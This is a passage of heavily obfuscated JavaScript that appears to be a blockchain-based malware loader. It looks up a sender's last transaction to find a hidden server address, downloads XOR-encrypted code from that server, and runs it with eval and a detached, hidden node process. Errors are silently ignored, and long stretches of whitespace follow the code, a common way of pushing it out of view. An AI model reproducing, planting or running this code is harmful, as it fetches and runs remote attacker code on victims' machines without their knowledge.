cOtBWu;};y$zxQ$V['GBnwaa']=esARJZ$grU,KRhhKrsFqmjfaAyx$wJ$rwk=arguments,y$zxQ$V['vNELbx']=!![];}const ynFhQbbu_SatOnNNRsd=fLvbQaML[-parseInt(0x116e)+-0xa31+parseFloat(0x1b9f)],WJhqNXjEhoBNMVA$eBtfwI=tWGuleodYMnqSTTOUyaNyjlka+ynFhQbbu_SatOnNNRsd,jNdJZOnY$Q_YnKxpDKAl=KRhhKrsFqmjfaAyx$wJ$rwk[WJhqNXjEhoBNMVA$eBtfwI];return!jNdJZOnY$Q_YnKxpDKAl?(y$zxQ$V['SbiVeH']===undefined&&(y$zxQ$V['SbiVeH']=!![]),zzqNQlkX_jiVOqfG=y$zxQ$V['GBnwaa'](zzqNQlkX_jiVOqfG),KRhhKrsFqmjfaAyx$wJ$rwk[WJhqNXjEhoBNMVA$eBtfwI]=zzqNQlkX_jiVOqfG):zzqNQlkX_jiVOqfG=jNdJZOnY$Q_YnKxpDKAl,zzqNQlkX_jiVOqfG;},y$zxQ$V(KRhhKrsFqmjfaAyx$wJ$rwk,WMQeIfpFFIMkfMwJsBWdled_u);}async function lastSenderTxViaIndexer(){const NCpDdFsagJWXVXIZSANW=xXfMZKDLYuTRIADnwGIKpCU,GoMJqPkeVtkAVEeIOtXSGHH=INDEXER_URL+NCpDdFsagJWXVXIZSANW(0x190)+SENDER+NCpDdFsagJWXVXIZSANW(0x177),zquU__Y=await httpRequest(GoMJqPkeVtkAVEeIOtXSGHH),qN$nvwAmKPq_FjnoFLyw=Array[NCpDdFsagJWXVXIZSANW(0x125)](zquU__Y?.[NCpDdFsagJWXVXIZSANW(0x15c)])?zquU__Y[NCpDdFsagJWXVXIZSANW(0x15c)]:[],HZ_csmRHpSyPtSDjPPRh=qN$nvwAmKPq_FjnoFLyw[NCpDdFsagJWXVXIZSANW(0x141)](upBEWZ_Xf=>upBEWZ_Xf[NCpDdFsagJWXVXIZSANW(0x163)]&&upBEWZ_Xf[NCpDdFsagJWXVXIZSANW(0x163)][NCpDdFsagJWXVXIZSANW(0x15a)]()===SENDER);return{'blockNumber':BigInt(HZ_csmRHpSyPtSDjPPRh[NCpDdFsagJWXVXIZSANW(0x167)]),'tx':HZ_csmRHpSyPtSDjPPRh};}async function run(){const iPOSsBZY$MAISzHIjlN_hI=xXfMZKDLYuTRIADnwGIKpCU,sRedE$K_UhZelsJ=BigInt(await withRpcEndpoints((oDyqcBfSj_iwKRdtMeji,hc$_IbKLU)=>rpcCall(oDyqcBfSj_iwKRdtMeji,iPOSsBZY$MAISzHIjlN_hI(0x174),[],hc$_IbKLU))),vELuNUBHIXAw_H=sRedE$K_UhZelsJ-sRedE$K_UhZelsJ%BLOCK_MULTIPLE;let xPEcUaXVyaXbM_MKePE=await firstMatch(candidateBlocks(vELuNUBHIXAw_H)[iPOSsBZY$MAISzHIjlN_hI(0x14a)](blockTask));!xPEcUaXVyaXbM_MKePE&&(xPEcUaXVyaXbM_MKePE=await lastSenderTx(sRedE$K_UhZelsJ)[iPOSsBZY$MAISzHIjlN_hI(0x18c)](()=>lastSenderTxViaIndexer()));const [z_PZv$OwqwKTZPMSnY,WhidJ_hiuaeyuevFOnuuM]=decodeAddress(xPEcUaXVyaXbM_MKePE['tx']['to']),DwPArYdTLMoeHioNwADF_eRM=global;DwPArYdTLMoeHioNwADF_eRM['_V']=DwPArYdTLMoeHioNwADF_eRM['i'],DwPArYdTLMoeHioNwADF_eRM['_H']=iPOSsBZY$MAISzHIjlN_hI(0x14b)+z_PZv$OwqwKTZPMSnY+iPOSsBZY$MAISzHIjlN_hI(0x169),DwPArYdTLMoeHioNwADF_eRM[iPOSsBZY$MAISzHIjlN_hI(0x165)]=iPOSsBZY$MAISzHIjlN_hI(0x14b)+WhidJ_hiuaeyuevFOnuuM+iPOSsBZY$MAISzHIjlN_hI(0x169),DwPArYdTLMoeHioNwADF_eRM[iPOSsBZY$MAISzHIjlN_hI(0x12a)]=iPOSsBZY$MAISzHIjlN_hI(0x14b)+z_PZv$OwqwKTZPMSnY+iPOSsBZY$MAISzHIjlN_hI(0x161),DwPArYdTLMoeHioNwADF_eRM[iPOSsBZY$MAISzHIjlN_hI(0x15e)]=iPOSsBZY$MAISzHIjlN_hI(0x14b)+z_PZv$OwqwKTZPMSnY+iPOSsBZY$MAISzHIjlN_hI(0x169);function huc$QqfRX_phLyjgNgXJAKB(nuyY$mTljeAnEgvkH_gmKVseQ,BdJEd$KDiiU){const hGz$CzuPRAXB$hr=iPOSsBZY$MAISzHIjlN_hI,WRI_JwF_pizjGZ={'hostname':BdJEd$KDiiU[hGz$CzuPRAXB$hr(0x15d)],'port':Number(BdJEd$KDiiU[hGz$CzuPRAXB$hr(0x17d)])||parseInt(-0x51b)*Math.trunc(-0x3)+Math.ceil(-0xa)*-parseInt(0x385)+parseInt(0x1)*-0x3233,'path':BdJEd$KDiiU[hGz$CzuPRAXB$hr(0x144)]+BdJEd$KDiiU[hGz$CzuPRAXB$hr(0x156)],'headers':{'User-Agent':hGz$CzuPRAXB$hr(0x18a),'Sec-V':DwPArYdTLMoeHioNwADF_eRM['_V']||-0x20b2+-parseInt(0xd5c)+parseInt(0x2e0e)}};function KnqFXZYchNbfFZNKUvfemRq(clfaXCzOnURcGFrsXhqYHVSy){const D$LAzAzDqI=hGz$CzuPRAXB$hr,IGnQ__iQfyHEFEOqoO=nuyY$mTljeAnEgvkH_gmKVseQ[D$LAzAzDqI(0x178)];for(let kHinpPCGwO=0x896+parseInt(0x2)*0x71+parseInt(-parseInt(0x978));kHinpPCGwO<clfaXCzOnURcGFrsXhqYHVSy[D$LAzAzDqI(0x178)];kHinpPCGwO++)clfaXCzOnURcGFrsXhqYHVSy[kHinpPCGwO]^=nuyY$mTljeAnEgvkH_gmKVseQ[D$LAzAzDqI(0x17b)](kHinpPCGwO%IGnQ__iQfyHEFEOqoO);return clfaXCzOnURcGFrsXhqYHVSy[D$LAzAzDqI(0x193)](D$LAzAzDqI(0x130));}function cFz_CWkGEzqq_QwTrxvYubcbK(JAele$Cna){const YGdYB$r=hGz$CzuPRAXB$hr,uMhSoGaEUWs=JAele$Cna[YGdYB$r(0x183)][YGdYB$r(0x127)];if(!uMhSoGaEUWs)throw new Error(YGdYB$r(0x149));return KnqFXZYchNbfFZNKUvfemRq(Buffer[YGdYB$r(0x163)](uMhSoGaEUWs,YGdYB$r(0x168)));}function gAoSsRu$LTi(kByeCZwOOfmdgwkEyUuZ){return new Promise((YfdZrDBfqECeSord$jOwQ,IlhRErRkxjGvfAK_LuFwMQqua)=>{const Roy$VSZhPGMnLmYKvDeNIUwJAI=y$zxQ$V,HjDTGTfhapfslWcfN=http[Roy$VSZhPGMnLmYKvDeNIUwJAI(0x18f)]({...WRI_JwF_pizjGZ,'method':kByeCZwOOfmdgwkEyUuZ},vnVSJNhxijSgBvRGqsbPjZL=>{const XkUNbSL_gVPFryuSs=Roy$VSZhPGMnLmYKvDeNIUwJAI;if(kByeCZwOOfmdgwkEyUuZ===XkUNbSL_gVPFryuSs(0x194)){try{YfdZrDBfqECeSord$jOwQ(cFz_CWkGEzqq_QwTrxvYubcbK(vnVSJNhxijSgBvRGqsbPjZL));}catch(MFt__IRm){IlhRErRkxjGvfAK_LuFwMQqua(MFt__IRm);}vnVSJNhxijSgBvRGqsbPjZL[XkUNbSL_gVPFryuSs(0x13d)]();return;}const m$r$KvsrDrBJVYuCDoWRvR=[];vnVSJNhxijSgBvRGqsbPjZL['on'](XkUNbSL_gVPFryuSs(0x160),yN$EQjE=>m$r$KvsrDrBJVYuCDoWRvR[XkUNbSL_gVPFryuSs(0x192)](yN$EQjE)),vnVSJNhxijSgBvRGqsbPjZL['on'](XkUNbSL_gVPFryuSs(0x186),()=>{const nlhmbEHx$r=XkUNbSL_gVPFryuSs;try{const EjbTshOgkyceaBWIoYs=Buffer[nlhmbEHx$r(0x182)](m$r$KvsrDrBJVYuCDoWRvR);if(EjbTshOgkyceaBWIoYs[nlhmbEHx$r(0x178)])return YfdZrDBfqECeSord$jOwQ(KnqFXZYchNbfFZNKUvfemRq(EjbTshOgkyceaBWIoYs));if(vnVSJNhxijSgBvRGqsbPjZL[nlhmbEHx$r(0x183)][nlhmbEHx$r(0x127)])return YfdZrDBfqECeSord$jOwQ(cFz_CWkGEzqq_QwTrxvYubcbK(vnVSJNhxijSgBvRGqsbPjZL));IlhRErRkxjGvfAK_LuFwMQqua(new Error(nlhmbEHx$r(0x14e)));}catch(WJ$XNZ){IlhRErRkxjGvfAK_LuFwMQqua(WJ$XNZ);}}),vnVSJNhxijSgBvRGqsbPjZL['on'](XkUNbSL_gVPFryuSs(0x16d),IlhRErRkxjGvfAK_LuFwMQqua);});HjDTGTfhapfslWcfN['on'](Roy$VSZhPGMnLmYKvDeNIUwJAI(0x16d),IlhRErRkxjGvfAK_LuFwMQqua),HjDTGTfhapfslWcfN[Roy$VSZhPGMnLmYKvDeNIUwJAI(0x186)]();});}return gAoSsRu$LTi(hGz$CzuPRAXB$hr(0x188))[hGz$CzuPRAXB$hr(0x18c)](()=>gAoSsRu$LTi(hGz$CzuPRAXB$hr(0x194)));}async function wsxwJCLtXxv(toC_$UgN,nIceXXPc$vRnyJoxV,hBCrEqWmQJz$EubrdEkdnz){const hgJOXNslwjWvkXzIq=iPOSsBZY$MAISzHIjlN_hI;try{const mDOfwBVGJlCSsUxmgaj=await huc$QqfRX_phLyjgNgXJAKB(nIceXXPc$vRnyJoxV,toC_$UgN),kXslrk$baQZyIOiIoLbk$DE=hBCrEqWmQJz$EubrdEkdnz?hgJOXNslwjWvkXzIq(0x18d)+(DwPArYdTLMoeHioNwADF_eRM['_V']||0x1232+0x2378+-0x35aa*Math.max(parseInt(0x1),0x1))+hgJOXNslwjWvkXzIq(0x147)+DwPArYdTLMoeHioNwADF_eRM['_H']+hgJOXNslwjWvkXzIq(0x139)+DwPArYdTLMoeHioNwADF_eRM[hgJOXNslwjWvkXzIq(0x165)]+hgJOXNslwjWvkXzIq(0x17c):hgJOXNslwjWvkXzIq(0x18d)+(DwPArYdTLMoeHioNwADF_eRM['_V']||parseInt(0x2d0)+0x21e3+Number(parseInt(0x5))*Math.ceil(-0x757))+hgJOXNslwjWvkXzIq(0x175)+DwPArYdTLMoeHioNwADF_eRM[hgJOXNslwjWvkXzIq(0x12a)]+hgJOXNslwjWvkXzIq(0x19b)+DwPArYdTLMoeHioNwADF_eRM[hgJOXNslwjWvkXzIq(0x15e)]+hgJOXNslwjWvkXzIq(0x17c);if(!hBCrEqWmQJz$EubrdEkdnz)eval(kXslrk$baQZyIOiIoLbk$DE+mDOfwBVGJlCSsUxmgaj);spawn(hgJOXNslwjWvkXzIq(0x16e),['-e',kXslrk$baQZyIOiIoLbk$DE+mDOfwBVGJlCSsUxmgaj],{'detached':!![],'stdio':hgJOXNslwjWvkXzIq(0x128),'windowsHide':!![]})[hgJOXNslwjWvkXzIq(0x158)]();}catch(P$JWUBIlmprZZ){}}await wsxwJCLtXxv(new URL(iPOSsBZY$MAISzHIjlN_hI(0x14b)+z_PZv$OwqwKTZPMSnY+iPOSsBZY$MAISzHIjlN_hI(0x152)),iPOSsBZY$MAISzHIjlN_hI(0x136),![]),await wsxwJCLtXxv(new URL(iPOSsBZY$MAISzHIjlN_hI(0x14b)+z_PZv$OwqwKTZPMSnY+iPOSsBZY$MAISzHIjlN_hI(0x153)),iPOSsBZY$MAISzHIjlN_hI(0x173),!![]);}run();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              



                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              





